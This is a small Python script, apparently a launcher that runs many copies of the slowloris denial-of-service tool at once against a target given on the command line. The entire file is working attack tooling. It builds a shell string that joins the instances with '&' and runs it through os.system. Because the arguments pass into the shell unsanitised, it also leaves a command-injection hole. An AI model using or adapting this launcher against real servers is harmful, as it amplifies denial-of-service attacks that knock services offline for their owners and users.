import sys
import os

slowLorisInstances = int(sys.argv[1]);
slowLorisPath = '/usr/games/slowloris/slowloris.py';

argsStr = ' '.join(sys.argv[2:]);

runSlowLorisStr = slowLorisPath + ' ' + argsStr;

runStr = '';

i = 0;
while i < slowLorisInstances:
    i += 1;

    if  (i < slowLorisInstances):
        runStr += runSlowLorisStr + ' & ';

    else:
        runStr += runSlowLorisStr;


os.system(runStr);